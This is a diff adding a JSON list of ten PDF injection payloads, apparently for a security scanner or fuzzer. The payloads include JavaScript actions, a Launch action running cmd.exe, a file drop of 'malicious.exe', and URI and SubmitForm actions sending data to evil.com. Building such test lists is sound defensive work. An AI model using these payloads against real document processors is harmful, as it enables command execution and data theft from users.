@@ -1,0 +1,62 @@
+[
+  {
+    "id": "pdf-001", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "%PDF-1.4", "context": "string",
+    "description": "PDF Injection - Version string spoof",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-002", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "%EndObj", "context": "string",
+    "description": "PDF Injection - End object marker",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-003", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type /Action /S /JavaScript /JS (app.alert(1))>>", "context": "string",
+    "description": "PDF Injection - Embedded JavaScript execution",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-004", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type /Action /S /URI /URI (http://evil.com)>>", "context": "string",
+    "description": "PDF Injection - Embedded URI action",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-005", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj", "context": "string",
+    "description": "PDF Injection - Object injection",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-006", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type /Annot /Subtype /Link /A <</S /URI /URI (http://evil.com)>> /Rect [0 0 900 900]>>", "context": "string",
+    "description": "PDF Injection - Link Annotation (SSRF via PDF viewer)",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-007", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type/Action/S/Launch/F(cmd.exe)/D(c:\\\\windows)/P(/c echo vulnerable > test.txt)>>", "context": "string",
+    "description": "PDF Injection - Launch Action (Command Execution)",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-008", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type/Action/S/SubmitForm/F(http://evil.com/leak)>>", "context": "string",
+    "description": "PDF Injection - SubmitForm Action",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-009", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<</Type/Page/Contents 1 0 R>> 1 0 obj <</Length 20>> stream BT /F1 24 Tf 100 100 Td (Injected text) Tj ET endstream endobj", "context": "string",
+    "description": "PDF Injection - Page content stream",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  },
+  {
+    "id": "pdf-010", "family": "pdf_injection", "subtype": "pdf_injection",
+    "payload_string": "<script>this.exportDataObject({cName: \"malicious.exe\", nLaunch: 2});</script>", "context": "string",
+    "description": "PDF Injection - Embedded payload drop",
+    "references": ["https://portswigger.net/bappstore/459ba29863c04221b6d194af21c60fc9"], "platform_specific": {}
+  }
+]
